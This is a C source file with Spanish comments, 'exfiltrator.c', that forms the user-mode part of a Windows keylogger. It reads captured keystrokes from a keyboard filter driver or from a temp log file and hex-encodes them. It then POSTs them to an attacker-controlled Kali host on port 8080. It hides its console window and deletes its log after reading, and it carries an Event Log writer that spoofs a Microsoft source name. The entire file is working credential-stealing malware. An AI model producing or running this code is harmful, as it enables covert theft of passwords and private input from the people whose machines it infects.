// exfiltrator.c - Programa en user mode que EXFILTRA las teclas
#include <windows.h>
#include <stdio.h>
#include <wininet.h>

#define IOCTL_GET_KEY_BUFFER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Función para escribir en EventLog camuflado
BOOL WriteToEventLog(const char* data, DWORD len) {
    HANDLE hEventLog = RegisterEventSourceA(NULL, "Microsoft-Windows-Kernel-PnP");
    if (!hEventLog) return FALSE;
    
    // Reportar como evento de información de dispositivo
    const char* strings[] = { data };
    
    BOOL result = ReportEventA(
        hEventLog,
        EVENTLOG_INFORMATION_TYPE,
        0,
        0x40000015,
        NULL,
        1,
        len,
        strings,
        NULL
    );
    
    DeregisterEventSource(hEventLog);
    return result;
}

// Función para enviar por HTTPS camuflado
BOOL ExfiltrateViaHTTPS(const char* data, DWORD len) {
    HINTERNET hSession, hConnect, hRequest;
    BOOL result = FALSE;
    
    hSession = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0
    );
    
    if (!hSession) return FALSE;
    
    // CAMBIA "192.168.1.100" POR LA IP DE TU KALI
    hConnect = InternetConnectA(
        hSession,
        "10.0.2.15",  // ← CAMBIA ESTO A TU IP DE KALI
        8080,              // Puerto donde escuchas
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        0
    );
    
    if (!hConnect) {
        InternetCloseHandle(hSession);
        return FALSE;
    }
    
    hRequest = HttpOpenRequestA(
        hConnect,
        "POST",
        "/",
        NULL,
        NULL,
        NULL,
        INTERNET_FLAG_RELOAD,  // Sin SSL para pruebas
        0
    );
    
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);
        return FALSE;
    }
    
    // Añadir headers legítimos
    LPCSTR headers = "Content-Type: application/x-www-form-urlencoded\r\n";
    
    // Construir datos POST
    char post_data[8192];
    snprintf(post_data, sizeof(post_data), "keys=%s", data);
    
    // Enviar datos
    if (HttpSendRequestA(
        hRequest,
        headers,
        strlen(headers),
        post_data,
        strlen(post_data)
    )) {
        result = TRUE;
    }
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    
    return result;
}

int main() {
    HANDLE hDevice;
    char buffer[4096];
    DWORD bytesReturned;
    
    // Ocultar ventana de consola (opcional)
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    
    // Abrir driver
    hDevice = CreateFileA(
        "\\\\.\\KeyboardFilter",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (hDevice == INVALID_HANDLE_VALUE) {
        // Si no hay driver, intentar con archivo de log directo (keylogger user-mode)
        while(1) {
            FILE* f = fopen("C:\\Windows\\Temp\\keys.log", "rb");
            if (f) {
                fseek(f, 0, SEEK_END);
                long size = ftell(f);
                fseek(f, 0, SEEK_SET);
                
                if (size > 0 && size < sizeof(buffer)) {
                    fread(buffer, 1, size, f);
                    fclose(f);
                    
                    // Borrar archivo
                    remove("C:\\Windows\\Temp\\keys.log");
                    
                    // Enviar datos
                    char hex_data[8192] = "";
                    for(int i = 0; i < size; i++) {
                        char hex[10];
                        sprintf(hex, "%02x", (unsigned char)buffer[i]);
                        strcat(hex_data, hex);
                    }
                    
                    ExfiltrateViaHTTPS(hex_data, strlen(hex_data));
                } else {
                    fclose(f);
                }
            }
            Sleep(30000); // Esperar 30 segundos
        }
        return 1;
    }
    
    // Bucle principal con driver
    while (1) {
        // Leer buffer de teclas cada 30 segundos
        Sleep(30000);
        
        if (DeviceIoControl(
            hDevice,
            IOCTL_GET_KEY_BUFFER,
            NULL,
            0,
            buffer,
            sizeof(buffer),
            &bytesReturned,
            NULL
        )) {
            if (bytesReturned > 0 && bytesReturned < sizeof(buffer)) {
                // Convertir a hexadecimal para enviar
                char hex_data[8192] = "";
                for (DWORD i = 0; i < bytesReturned; i++) {
                    char hex[10];
                    sprintf(hex, "%02x", (unsigned char)buffer[i]);
                    strcat(hex_data, hex);
                }
                
                // Intentar exfiltrar
                if (ExfiltrateViaHTTPS(hex_data, strlen(hex_data))) {
                    // Éxito
                } else {
                    // Fallback: guardar en archivo
                    FILE* f = fopen("C:\\Windows\\Temp\\keys_backup.log", "a");
                    if (f) {
                        fprintf(f, "%s\n", hex_data);
                        fclose(f);
                    }
                }
            }
        }
    }
    
    CloseHandle(hDevice);
    return 0;
}
